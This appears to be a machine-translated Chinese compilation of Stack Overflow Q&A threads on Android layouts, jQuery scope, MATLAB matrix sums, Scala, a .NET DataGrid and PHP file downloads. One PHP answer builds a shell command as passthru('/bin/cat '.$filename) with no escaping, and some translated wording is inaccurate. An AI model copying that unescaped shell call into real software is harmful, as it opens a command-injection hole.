如果这是一个实例方法，事情就会变得更加困难。[如何编组 C++ 类](http://www.codeproject.com/Articles/18032/How-to-Marshal-a-C-Class)。

# android - 动态添加布局组件（结合xml和手动布局）

> ID：11786686
> 
> 赞同：3
> 
> 时间：2012-08-02T22:21:27.037
> 
> 标签：android, android-layout

有没有办法将基于 xml 的布局和“手动”布局结合起来？例如：

我使用这样的“标准”xml布局：

```
 setContentView(R.layout.mainscreen); 
```

然后我想要一些更动态的内容，像这样添加它：

```
 LinearLayout layout = new LinearLayout(this);
 setContentView(layout);
 layout.addView(new CreateItemButton(this, "Button", 1)); 
```

我意识到我不能像上面一行那样创建一个新的布局，但我可能不得不以某种方式初始化 xml 布局。但是 - 是否有可能，或者如果我想动态添加组件，我是否只需要 100% 手动布局？或者是否有另一种更优雅/正确的方法？

（我想要做的是根据从数据库中获取的条目创建按钮。这些按钮在数量和文本/内容方面会很谨慎，因此尝试动态添加它们而不是在 xml 布局文件中。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T22:39:11.037

您可以将任何元素动态添加到您的 xml 布局中。您必须在 xml 布局中有一个容器，您将在其中添加动态元素。说 id="container" 的空 LinearLayout。您还可以动态构建所有内容并 setContentView(yourView); where is yourView 是添加了其他子元素的根布局元素。

前任：

```
Button myButton = new Button(this);
myButton.setLayoutParams(params);
LinearLayout container = (LinearLayout)findViewById(R.id.container);
container.addView(myButton); 
```

或者

```
LinearLayout myLayout = new LinearLayout(this);  
...
container.addView(myLayout); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T05:21:14.053

我希望它对你有帮助。

试试这个代码...

```
public class MainActivity extends Activity {

   @Override
   public void onCreate(Bundle savedInstanceState) {
       super.onCreate(savedInstanceState);
       setContentView(R.layout.activity_main);   

       RelativeLayout rl= (RelativeLayout) findViewById(R.id.rl);
       Button b2=new Button(this);
       b2.setLayoutParams(new LayoutParams(LayoutParams.WRAP_CONTENT,LayoutParams.WRAP_CONTENT));
       b2.setText("Dynamic");
       b2.setTextSize(30);
       b2.setTextColor(b1.getTextColors());
       rl.addView(b2);
    }
} 
```

# android - android中的while循环不起作用

> ID：11786693
> 
> 赞同：0
> 
> 时间：2012-08-02T22:22:05.050
> 
> 标签：android, while-loop, android-activity

```
package veda.software.game;
import java.util.ArrayList;
import java.util.Iterator;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
public class RandomNumGenActivity extends Activity  {
    View v1 = new View(getApplicationContext());
    TextView txtName;
    Button submitbutton;
    int choice;
    Integer level = 1;
    String toRem = "";
    int life = 0;
    int score;
    boolean watsUp1 = true;
    Handler myHandler =  new Handler();
    int noOfGames = 0;
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.screen2);
        txtName = (TextView) findViewById(R.id.editText1);
        submitbutton = (Button) findViewById(R.id.button1);
        Intent i = getIntent();
        choice = Integer.parseInt(i.getStringExtra("choice"));
        this.scoreLife(); 
    }
    public void scoreLife(){
        while(true){
            // TODO Auto-generated method stub
            if(watsUp1==true){
                Context context = getApplicationContext();
                CharSequence text = "you have to remember the !!"+"The"+level.toString()+"from last";
                int duration = Toast.LENGTH_SHORT;
                Toast toast = Toast.makeText(context, text, duration);
                toast.setGravity(Gravity.TOP|Gravity.LEFT, 0, 400);
                toast.show();
                watsUp1=false;
                noOfGames++;
                if(noOfGames==5){
                    noOfGames=0;
                    level++;
                }
                if(level==9){
                    break;
                }
                else{
                    RandomNumGenActivity.this.startTheGame();
                }
            }
        }
    }
    public int getArraySize(){
        int arraySize = 0 + (int)(Math.random() * ((9 - 0) + 1));
        return arraySize;
    }
    public void startTheGame(){
        ArrayList<Integer> arrayOfNum = new ArrayList<Integer>();
        int arraySize = this.getArraySize();
        if(arraySize<level&&arraySize<4){
            arraySize = this.getArraySize();
        }
        else{
            for (int idx = 1; idx <= arraySize; ++idx){
                int randomInt = choice*1 + (int)(Math.random() * ((choice*9 - choice*1) + 1));
                arrayOfNum.add(randomInt);
                Log.d("randomInt are:",""+randomInt);
            }
            this.theGame(arrayOfNum);
        }
    }
    public void theGame(ArrayList<Integer> theArray){
        Iterator<Integer> ite = theArray.iterator();
        int counter = 0;
        while(ite.hasNext()){
            counter++;
            String temp = ite.next().toString();
            if(counter == theArray.size()-level){
                toRem = temp.toString();
            }

            Log.d("random array elements are:",""+temp);
            showToast(temp);
        }
    }   
    public void showToast(String txtToDisplay){
        Log.d("inside showToast",""+txtToDisplay);
        Context context = getApplicationContext();
        int duration = Toast.LENGTH_LONG;
        Toast toast = Toast.makeText(context, txtToDisplay, duration);
        toast.show();
    }
    public void buttonClick(View v1){
        final Handler handler = new Handler();
        final Runnable updater = new Runnable() {
            public void run() {
                String req = txtName.getText().toString();
                System.out.println("req is"+req );
                if(req.equals(toRem)){
                    Context context = getApplicationContext();
                    CharSequence text = "yo!! you got it right buddy";
                    int duration = Toast.LENGTH_SHORT;
                    Toast toast = Toast.makeText(context, text, duration);
                    toast.show();
                    watsUp1=true;
                }
                else{
                    Context context = getApplicationContext();
                    CharSequence text = "you are fired!!";
                    int duration = Toast.LENGTH_SHORT;
                    Toast toast = Toast.makeText(context, text, duration);
                    toast.show();
                    watsUp1=true;
                }
            }
        };
        Thread x = new Thread() {
            public void run() {
                handler.post(updater);
            }
        };
    }   
} 
```

*

此代码不起作用。我是 android 的初学者，我认为这应该有效。请帮助..我没有收到错误。我的屏幕只是变黑了。这段代码到底哪里出了问题？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:28:28.317

你那里有一些非常糟糕的结构......

导致黑屏的原因是这个无限循环`while(true)`，你设置的永远不会是真的，它会永远循环，没有执行任何操作。`watsUp1=false``watsUp1==true`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T21:17:09.167

您使用无限循环的事实可能是问题所在。事实上，我想不出很多情况下无限循环不是问题。无论如何，您的循环似乎遍历了第一个 if 块

> 如果（watsUp1==真）{

然后在该块中设置 watsUp1 = false，除非您处于无限循环中，否则这不会是问题。

此外，我将致力于让您的代码在未来更美观。

# c# - 正确传输和处理表单上发生的键盘事件

> ID：11786695
> 
> 赞同：1
> 
> 时间：2012-08-02T22:22:14.213
> 
> 标签：c#, .net, vb.net

我的问题的最佳示例是 ComboBox，当您单击下拉菜单时，会出现一个窗口，但如果您键入它仍然会进入 ComboBox。我有一个类似的设置。我有一个触发表单显示的特定事件（它现在处于活动状态 - 如果它失去焦点，表单关闭），用户应该能够在该表单上键入，并且所有键盘事件都应该传递给并由其处理，文本框。快捷键也需要处理。试图找出最好的就是这样做。我会使用 NativeWindow 并处理 WndProc 将消息中继到 TextBox 吗？似乎应该有一个相当简单的方法来做到这一点。

我已经得到了一些半工作的实现，但不适用于特定键，例如退格键或 Ctrl + A。

谢谢你的帮助。

# jquery - jquery范围内的父“$（this）”

> ID：11786696
> 
> 赞同：3
> 
> 时间：2012-08-02T22:22:24.073
> 
> 标签：jquery

我有一个`$.fn.sample = function()`被调用者，假设`$('#example').sample();`在函数内部我可以在它的范围内使用“this”：

```
$.fn.sample = function(){
   console.log($(this).width()); 
} //In this case, it would log the width of #example 
```

但是假设我将悬停函数调用到另一个元素中，就像这样

```
$.fn.sample = function(){ 
  console.log($(this).width()); 
  $('#other').hover(function(){
    //Here, $(this) will refer to #other
  });
} 
```

那么，在悬停函数“$(this)”内部将引用#other，有没有办法使用“父”$(this)？在这种情况下，这个悬停函数中的“#example”？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:25:14.177

您可能希望将原始引用编写为内部函数`this`的[闭包，如下所示：](http://www.javascriptkit.com/javatutors/closures.shtml)

```
$.fn.sample = function(){ 
  var $parent = $(this);
  console.log($parent.width()); 
  $('#other').hover(function(){
    //Here, $(this) will refer to #other
    $parent.....
  });
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T22:29:36.970

答案是肯定的，但不是父母。

您的问题的一个常见解决方案是使用“那个”变量：

```
$.fn.sample = function(){ 
  console.log($(this).width());

  var that = $(this);             // <-- good pattern for traversing scope.

  $('#other').hover(function(){

    //Here, that will refer to the parent.
  }); 
```

}

我相信这最初[是由 Douglas Crockford 提出的](http://javascript.crockford.com/private.html)，但我不确定其来源。该链接将提供技术细节，但事实证明，这种用法对于“私人数据成员”非常重要。

**关于最佳实践的另一个非常重要的观点......**

我真的建议使用该模式，但不要调用变量“that”。

原因如下：

知道 -> 变量来自哪里并不重要，但 -> 它是什么。在实践中，a 可能来自一个包装范围，许多行代码远离当前有问题的行。从可维护性的角度来看，尝试弄清楚“那个”是什么是浪费时间，如果甚至不知道“这个”是什么，那就更令人沮丧了。相反，我们应该把它称为它的本来面目，让作用域成为它的本来面目。

例如，

```
var button_container; //instead of that. 
```

此外，其他人正在使用添加美元符号的命名约定。

```
var $name; 
```

这没关系，但可能会令人困惑。值得一提的是，它表示该对象是一个 jQuery 对象。

希望有帮助。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T22:24:54.253

最简单的方法是保存参考：

```
$.fn.sample = function(){ 
  console.log($(this).width());
  var $that = $(this)
  $('#other').hover(function(){
    // Here, $(this) will refer to #other
    // but $that will still be the same as above!
  });
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-02T22:25:23.760

缓存`this`到`$this`：

```
$.fn.sample = function(){
  var $this = $(this);
  console.log($this.width()); 
  $('#other').hover(function(){
    // Here, $(this) will refer to #other
    // and $this will refer to the selector that called sample()
  });
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-08-03T01:32:30.523

以前使用命名变量的解决方案是解决您的特定问题的方法。所以选择其中之一。ClintNash 的回答特别有见地。

然而，这导致大多数人不了解 JavaScript 作用域以及闭包是/做什么。

有关 JavaScript 闭包、范围等的深入阅读，请参阅此博客文章（不是我的）：http: [//jibbering.com/faq/notes/closures/](http://jibbering.com/faq/notes/closures/)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-02T22:26:01.357

你需要以某种方式存储它 EG

```
$.fn.sample = function(){ 
  $parent = $(this);
  console.log($(this).width()); 
  $('#other').hover(function(){
    //Here, $(this) will refer to #other
    // use $parent in here. 
  });
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-02T22:25:08.043

```
$.fn.sample = function() {
  var $n = $(this);
  console.log($n.width()); 
  $('#other').hover(function(){
    // use $n
  });
} 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-08-02T22:35:28.040

我会选择此处给出的任何其他选项，但作为替代方案，您可以使用函数的[apply](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Function/apply)方法将其设置为您想要的。

# c# - 接受 MethodInfo 对象的方法的单元测试

> ID：11786705
> 
> 赞同：0
> 
> 时间：2012-08-02T22:23:10.453
> 
> 标签：c#, .net, unit-testing

我需要对一个接收任意用户代码方法的*MethodInfo*对象的方法进行单元测试（通过反射动态加载）。

```
public string SomeMethod(MethodInfo methodInfo); 
```

我想使用不同的*MethodInfo*对象来练习这个方法。

最简单的方法是使用`<type>.GetMethod("name")`检索*MethodInfo*对象，然后使用它调用测试方法并对结果进行断言。

我想涵盖尽可能多的“不同”方法信息（或更具体地说，要传入尽可能多的不同方法）。

我正在考虑两种方法，不确定是否应该这样做：

1.  使用我需要的所有方法创建一个新的测试类。使用这种类型的 GetMethods() 并对其进行迭代以将它们提供给我的测试方法。

2.  为每个方法创建一个单独的单元测试。

第一个选项更容易扩展（向测试类添加新方法），但包含多个断言（针对它拥有的每个 MethodInfo 实例进行断言）。

我们如何轻松解决这个问题并为这个特定场景创建一个健壮的测试？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:38:39.617

> 使用我需要的所有方法创建一个新的测试类。使用这种类型的 GetMethods() 并对其进行迭代以将它们提供给我的测试方法。

如果`SomeMethod`（处理此 MethodInfo）中的逻辑具有处理所有类型 MethodInfo 的通用逻辑，则按上述路线进行。

> 为每个方法创建一个单独的单元测试。

如果其中的逻辑`SomeMethod`对各种类型的 MethodInfo 有特定的个案逻辑，则按上述路线进行。

# matlab - 如何在没有循环的情况下在 MATLAB 中对 sumatrixes 求和？

> ID：11786706
> 
> 赞同：1
> 
> 时间：2012-08-02T22:23:15.773
> 
> 标签：matlab, matrix, sum

我有一个大矩阵（时间 x 频率），我想部分减少它。我想将每 1000 行（时间样本）相加，保持频率信息，这是一种分割。

有没有什么方法可以在 MATLAB 中没有任何循环？

一个较小的例子：

```
M=[1 2 3; 2 3 4; 5 8 7; 5 6 7; 1 2 3; 1 2 4]; 
```

我想将每 2 行相加，所以我得到：

```
[3 5 7; 10 14 14; 2 4 7] 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T14:55:30.403

假设您有一个包含 N 行和 M 列的矩阵，并且您想将每 R 行相加（其中 N 可以被 R 整除），

```
>> mat = [1 2 3; 2 3 4; 5 8 7; 5 6 7; 1 2 3; 1 2 4]
mat =
     1     2     3
     2     3     4
     5     8     7
     5     6     7
     1     2     3
     1     2     4

>> [N, M] = size(mat); %=> [6, 3]
>> R = 2; 
```

以下将允许您对 R 行的组求和：

```
>> res = reshape(mat, R, [])
res = 
     1     5     1     2     8     2     3     7     3
     2     5     1     3     6     2     4     7     4

>> res = sum(res) 
res =
     3    10     2     5    14     4     7    14     7

>> res = reshape(res, [], M)
res =
     3     5     7
    10    14    14
     2     4     7 
```

您还可以在一行中完成所有操作：

```
>> reshape(sum(reshape(mat, R, [])), [], M)
ans =
     3     5     7
    10    14    14
     2     4     7 
```

# list - scala：将 List[ Tuple3[A,B,C] ] 转换为 Foo(A, B, List[C]) 的最短方法

> ID：11786707
> 
> 赞同：2
> 
> 时间：2012-08-02T22:23:22.007
> 
> 标签：list, scala, mapping, instance, one-to-many

我有一个 List[ Tuple3[User, Order, OrderItem] ] 的查询结果

要创建 Invoice 的案例类实例，它的伴随对象需要一个 User、Order 和一个 List[OrderItem]。

目前我正在破解它：

```
def getInvoice(orderNum: String): Option[Invoice] = {

  val res = 
    dao.byOrderNum(orderNum) // List[ Tuple3[User, OrderEntry, OrderItem] ]

  if(!res.isEmpty) {
    val(user, order) = (res(0)._1, res(0)._2)
    val items = res map { case(_, _, oi: OrderItem) => oi }
    Some( Invoices.apply(user, order, items) ) // gets an Invoice
  }
  else None
} 
```

我可以将查询结果设为 a `List[ Option[Tuple3[User, Order, OrderItem]] ]`，这将使我对结果进行 flatMap，但不确定这对我有什么好处。

无论如何，必须是更简洁/优雅的问题解决方案

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T22:48:37.283

以下应该是完全等价的：

```
def getInvoice(orderNum: String): Option[Invoice] = {
  val res = dao.byOrderNum(orderNum)

  res.headOption.map {
    case (user, order, _) => Invoices(user, order, res.map(_._3))
  }
} 
```

关键是`headOption`，它以更惯用的方式处理空的检查（它给出`None`了一个空序列和`Some(xs.head)`一个非空序列）。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-02T23:42:18.540

东西很整洁，`headOption`你也可以使用它，因为它在那里，但你可以简单地在列表上进行模式匹配（而不是映射一个选项），这就是你的问题，但它只需要一些整理向上：

```
res match {
  case (a, b, _) :: _ => Some(Invoices(a, b, res.map(_._3)))
  case _              => None
} 
```

# asp.net - .NET 数据网格排序不正确

> ID：11786711
> 
> 赞同：0
> 
> 时间：2012-08-02T22:23:28.403
> 
> 标签：asp.net, .net, sorting, datagrid

我在下面有一个 .NET DataGrid，它不对列进行排序。例如，排序就像

10 100 21 即使 DataFormatString="{0:N0} 已设置，排序仍然无法正常工作。请帮助。

```
<asp:DataGrid ID="StatusGrid" CssClass="StatusGrid" runat="server" AutoGenerateColumns="false"
    UseAccessibleHeader="true" OnItemDataBound="StatusGrid_ItemDataBound" OnItemCommand="StatusGrid_ItemCommand">
    <Columns>

            ItemStyle-HorizontalAlign="Left" />
        <asp:BoundColumn DataField="Rating" HeaderText="Performance Rating" ItemStyle-Width="110px"
            ItemStyle-HorizontalAlign="Left" DataFormatString="{0:N0}"/>

    </Columns> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:30:43.557

这可能是列的数据类型有问题。它的排序就像它是一个字符串而不是一个数字。您的 DataFormatString 想法走在了正确的轨道上，但您需要将数据作为 int 传递到该列，或者实现此处描述的一些自定义排序：

[http://msdn.microsoft.com/en-us/library/aa984282(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/aa984282(v=vs.71).aspx)

# javascript - 在 Ajax 调用之后使 jquery 插件工作

> ID：11786717
> 
> 赞同：3
> 
> 时间：2012-08-02T22:23:56.413
> 
> 标签：javascript, jquery, django, dajaxice, dajax

这将是一个很长的帖子，但我真的受够了试图解决这个问题。我真的在寻找一些帮助来解决我的问题。

**第一的：**

`fade.js`：

```
$(document).ready(function(){
$(".gallery ul li img.a").fadeTo("slow", 0.5); // This sets the opacity of the thumbs to fade down to 30% when the page loads
$(".gallery ul li img.a").hover(function(){
    $(this).fadeTo("slow", 1.0); // This should set the opacity to 100% on hover
},function(){
    $(this).fadeTo("slow", 0.5); // This should set the opacity back to 30% on mouseout
});
}); 
```

这里的问题是在下一页的ajax调用之后，淡入淡出停止工作。所以我所做的是

```
$(document).ready(function(){
$(".gallery ul li img.a").fadeTo("slow", 0.5); // This sets the opacity of the thumbs to fade down to 30% when the page loads
$(".gallery ul li img.a").live("hover", function(){
    $(this).fadeTo("slow", 1.0); // This should set the opacity to 100% on hover
},function(){
    $(this).fadeTo("slow", 0.5); // This should set the opacity back to 30% on mouseout
    });
}); 
```

但这仅在我将鼠标悬停在图像上时才有效，然后图像会淡出。如果我做同样的`$(".gallery ul li img.a").fadeTo`事情`.live(...)`没有发生，那它根本行不通。

*   即使在 ajax 调用之后如何使这项工作正常工作，它应该在加载时淡出，然后当我将鼠标悬停在它上面时淡出。

**第二：**

我有一个在图像上向上滑动的小滑块`slider.js`：

```
$(document).ready(function(){
    //To switch directions up/down and left/right just place a "-" in front of the top/left attribute
//Full Caption Sliding (Hidden to Visible)
        $('.gallery li').hover(function(){
            $(".cover", this).stop().animate({top:'106px'},{queue:false,duration:160});
        }, function() {
            $(".cover", this).stop().animate({top:'153px'},{queue:false,duration:160});
        });
    }); 
```

我改成`$('.gallery li').hover(...)`，`$('.gallery li').live("hover", function(){...})`但还是不行。我也使用`.on`而不是`.live`因为它已被弃用。

我究竟做错了什么 ？我不是客户端的家伙，我的大部分工作都是服务器端的。我只需要在 AJAX 调用发生后让这 2 个插件工作。

阿贾克斯：

```
@dajaxice_register
def gallerypages(request, p):

try:
    page = int(p)
except:
    page = 1

items = gallerylist(page)
html = render_to_string('gallery_content.html',
                                {'items': items,}, 
                                context_instance = RequestContext(request))

dajax = Dajax()
dajax.assign('#gallery-content', 'innerHTML', html)
return dajax.json() 
```

编辑2：

```
<a href="#" onclick="Dajaxice.gallery.gallerypages(Dajax.process, {'p': {{ items.previous_page_number }},})" class="btn_prev"><b>&lt;</b></a> 
```

和

```
$(document).on("keydown", "#pagenumber", function(e)
    if ( e.which === 13 ) {
    Dajaxice.gallery.gallerypages(Dajax.process, {'p': this.value});
}}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T00:52:06.177

我不确定，但测试这些东西：

**通过 jQuery 的 JavaScript**

```
var initFade = function() {
    $(".gallery ul li img.a").fadeTo("slow", 0.5);
}

// your custom callback method
var reBindStuffs = function(data) {
    Dajax.process(data);
    // rebind your jquery event handlers here... e.g.
    initFade();
};

$(document).ready(function(){

    // initial first time loaded fade
    initFade();

    // hover live binder
    $(".gallery ul li img.a").live("hover", function(){
        $(this).fadeTo("slow", 1.0);
    },function(){
        $(this).fadeTo("slow", 0.5);
    });

    // document keydown listener 
    $(document).on("keydown", "#pagenumber", function(e)
        if ( e.which === 13 ) {
        Dajaxice.gallery.gallerypages('reBindStuffs', {'p': this.value});
    }});
}); 
```

**HTML**

```
<!-- a click listener -->
<a href="#" onclick="Dajaxice.gallery.gallerypages(reBindStuffs, {'p': {{ items.previous_page_number }},})" class="btn_prev"><b>&lt;</b></a> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T22:41:48.747

您使用 朝着正确的方向前进`live`，但因该事件而`live`贬值。`on`使用`on`，您可以将选择器包含为参数之一。最初的 jQuery 选择器只是您想要添加处理程序的对象的容器。

```
<div id="content">
    <div class="sombutton"></div>
</div>

$( document ).ready( function() {
   $( '#content' ).on( 'click', '.somebutton', function() {
      alert( 'do something' );
   } );
} ); 
```

现在即使我们替换`#conent`div 中的内容，新添加的内容与类`.somebutton`也将附加一个点击处理程序。

[http://api.jquery.com/on/](http://api.jquery.com/on/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-07-10T11:51:56.227

你说的问题很大，我手动刷新。但我也使用 .ajaxcomplete 功能。它在每次 Ajax 查询之后运行

```
$(document).ajaxComplete(function(){ 
    // Carga tabs por defecto por clases.
    if (typeof jQuery.fn.wf_responsivetab == 'function')
    {
        if ($('#rbtt_1').length)
        {
            $('#rbtt_1').wf_responsivetab({text: '...',});
            $(window).on('resize', function() {$('#rbtt_1').wf_responsivetab({text: '...',});});
        }
    }
}); 
```

# ios - CLLocation distanceFromLocation 大值

> ID：11786722
> 
> 赞同：1
> 
> 时间：2012-08-02T22:24:28.720
> 
> 标签：ios, cllocationmanager

我在使用 CLLocation distanceFromLocation 时遇到了一些问题。我有下面的代码，格式化以帮助调试，显式分配两个新位置等。无论哪种方式，两个几乎相同的位置都会导致巨大的差距，但只是有时。

代码：

```
CLLocation *loc = [LightweightLocationTracker sharedLocationTracker].lastLocation;
if (loc)
{
  CLLocation *myLoc = [[CLLocation alloc] initWithLatitude:loc.coordinate.latitude longitude:loc.coordinate.longitude];
  CLLocation *productLoc = [[CLLocation alloc] initWithLatitude:self.productToView.latitude longitude:self.productToView.longitude];        
  CLLocationDistance dist = [myLoc distanceFromLocation:productLoc];

  NSLog(@"myLoc.coordinate.latitude %f", myLoc.coordinate.latitude);        
  NSLog(@"myLoc.coordinate.longitude %f", myLoc.coordinate.longitude);                
  NSLog(@"productLoc.coordinate.latitude %f", productLoc.coordinate.latitude);
  NSLog(@"productLoc.coordinate.longitude %f", productLoc.coordinate.longitude);
  NSLog(@"dist %f", dist);        
  NSLog(@"%1.1f km", dist);
} 
```

一次运行 TTY：

```
[] tapped main
[] myLoc.coordinate.latitude 52.369200
[] myLoc.coordinate.longitude 13.941100
[] productLoc.coordinate.latitude 52.364400
[] productLoc.coordinate.longitude 13.360600
[] dist 39542.386770
[] 39542.4 km 
```

另一个运行 TTY：

```
[] myLoc.coordinate.latitude 52.369200
[] myLoc.coordinate.longitude 13.941100
[] productLoc.coordinate.latitude 52.369202
[] productLoc.coordinate.longitude 13.941100
[] dist 0.184915
[] 0.2 km 
```

没有看到罪魁祸首...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T22:37:33.390

好吧，`distanceFromLocation`返回米。所以30k的东西只是30km。对我来说听起来完全合法。

# php - 有什么方法可以保护我的未经授权使用的 php 代码？

> ID：11786731
> 
> 赞同：-1
> 
> 时间：2012-08-02T22:25:08.500
> 
> 标签：php, zend-framework

> **可能重复：**
> [在 PHP 源代码中混淆字符串值](https://stackoverflow.com/questions/5983709/obfuscating-string-values-in-php-source-code)

好吧，我有一个 php 脚本，我需要保护它以防止 1 编辑它，我该怎么做？有什么免费的方法吗？

编辑：一些朋友告诉我关于 bcompiler 的事？有人已经用过了吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T01:34:39.590

Ioncube 工作得很好，但是客户端必须在他们的服务器上运行一个 ioncube 反编译器。

# php - PHP readfile() 和大文件

> ID：11786734
> 
> 赞同：13
> 
> 时间：2012-08-02T22:25:15.720
> 
> 标签：php, apache

使用 readfile() 时——在 Apache 上使用 PHP——是文件立即读入 Apache 的输出缓冲区并且 PHP 脚本执行完成，还是 PHP 脚本执行等到客户端完成下载文件（或服务器超时，以先发生者为准）？

更长的背景故事：

我有一个网站，里面有很多大型 mp3 文件（当地教堂的布道）。并非音频存档中的所有文件都允许下载，因此 /sermon/{filename}.mp3 路径被重写以真正执行 /sermon.php?filename={filename} 如果允许下载文件，则内容类型设置为“audio/mpeg”并使用 readfile() 流式传输文件。我一直在抱怨（几乎完全来自通过 3G 传输下载的 iPhone 用户）文件没有完全下载，或者在大约 10 或 15 分钟后被切断。当我从使用 readfile() 流式传输文件切换到简单地重定向到文件时 -- header("Location: $file_url"); ——所有的抱怨都消失了（我什至检查了一些以前可以可靠地按需重现问题的用户）。

这让我怀疑在使用 readfile() 时，PHP 脚本引擎一直在使用，直到文件完全下载，但我找不到任何证实或否认这一理论的参考资料。我承认我在 ASP.NET 世界中更加自如，与 readfile() 等效的 dotNet 立即将整个文件推送到 IIS 输出缓冲区，因此 ASP.NET 执行管道可以独立于文件的传递完成到最终客户端... PHP + Apache 是否有与此行为等效的方法？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-03T11:59:09.207

在执行 readfile() 时，您可能仍然激活[PHP 输出缓冲。](http://www.php.net/manual/en/book.outcontrol.php)检查：

```
if (ob_get_level()) ob_end_clean(); 
```

或者

```
while (ob_get_level()) ob_end_clean(); 
```

这样，剩下的唯一输出缓冲区应该是 apache 的输出缓冲区，有关 apache 的调整，请参阅[SendBufferSize](http://httpd.apache.org/docs/2.2/mod/mpm_common.html#sendbuffersize)。

**编辑**

您还可以查看[mod_xsendfile](https://tn123.org/mod_xsendfile/)（[关于这种用法的 SO 帖子，PHP + apache + x-sendfile](https://stackoverflow.com/questions/80186/using-x-sendfile-with-apache-php)），这样您只需告诉 Web 服务器您已经完成了安全检查，现在他可以发送文件了。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-10-19T13:52:01.890

您可以做一些事情（我没有报告您需要发送的所有标头，这些标头可能与您当前在脚本中拥有的标头相同）：

```
set_time_limit(0);  //as already mention
readfile($filename);
exit(0); 
```

或者

```
passthru('/bin/cat '.$filename);
exit(0); 
```

或者

```
//When you enable mod_xsendfile in Apache
header("X-Sendfile: $filename"); 
```

或者

```
//mainly to use for remove files
$handle = fopen($filename, "rb");
echo stream_get_contents($handle);
fclose($handle); 
```

或者

```
$handle = fopen($filename, "rb");
while (!feof($handle)){
    //I would suggest to do some checking
    //to see if the user is still downloading or if they closed the connection
    echo fread($handle, 8192);
}
fclose($handle); 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-08-02T22:33:41.640

该脚本将一直运行，直到用户完成下载文件。最简单、最有效、最有效的解决方案是重定向用户：

```
header("Location: /real/path/to/file");
exit; 
```

但这可能会揭示文件的位置。使用 .htaccess 文件对可能不会被所有人下载的文件进行密码保护是个好主意，但也许您使用数据库来确定访问权限，这是没有选择的。

另一种可能的解决方案是将 PHP 的最大执行时间设置为 0，从而禁用限制：

```
set_time_limit(0); 
```

不过，您的主机可能不允许这样做。PHP 也先将文件读入内存，然后通过 Apache 的输出缓冲区，最后到达网络。让用户直接下载文件效率更高，并且没有 PHP 的最大执行时间等限制。

编辑：你从 iPhone 用户那里收到很多抱怨的原因可能是他们的连接速度较慢（例如 3G）。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-02T22:32:48.087

通过php下载文件效率不高，使用重定向是要走的路。如果您不想公开文件的位置，或者文件不在公共位置，那么请查看内部重定向，这里有一篇关于它的帖子，[我可以告诉 Apache 从 PHP 进行内部重定向吗？](https://stackoverflow.com/questions/270117/can-i-tell-apache-to-do-an-internal-redirect-from-php)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2017-02-21T16:29:34.287

尝试使用 stream_copy_to_stream() 代替。我发现它的问题比 readfile() 少。

```
set_time_limit(0);
$stdout = fopen('php://output', 'w');
$bfname = basename($fname);

header("Content-type: application/octet-stream");
header("Content-Disposition: attachment; filename=\"$bfname\"");

$filein = fopen($fname, 'r');
stream_copy_to_stream($filein, $stdout);

fclose($filein);
fclose($stdout); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-04-22T11:53:30.973

在 Apache 下，有一个很好的 elgant 解决方案，根本不涉及 php：

只需将 .htaccess 配置文件放入包含要提供下载的文件的文件夹中，其中包含以下内容：

```
<Files *.*>
ForceType applicaton/octet-stream
</Files> 
```

这告诉 Apache 提供此文件夹（及其所有子文件夹）中的所有文件以供下载，而不是直接在浏览器中显示它们。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-08-02T23:15:36.740

见下面网址

[http://php.net/manual/en/function.readfile.php](http://php.net/manual/en/function.readfile.php)

```
<?php
$file = 'monkey.gif';

if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    ob_clean();
    flush();
    readfile($file);
    exit;
}
?> 
```

# iphone - NSSortDescriptor 和 NSPredicate 用于排序和过滤

> ID：11786746
> 
> 赞同：0
> 
> 时间：2012-08-02T22:26:23.753
> 
> 标签：iphone, objective-c, ios, nspredicate, nssortdescriptor

我有一个 tableView，它有 5 个不同的可能数据源，具体取决于标志对象`(NSNumber *)dataSourceAssignment`。我已经实现了一个`NSSortDescriptor`按.`dataSource``(float)confidenceRating`

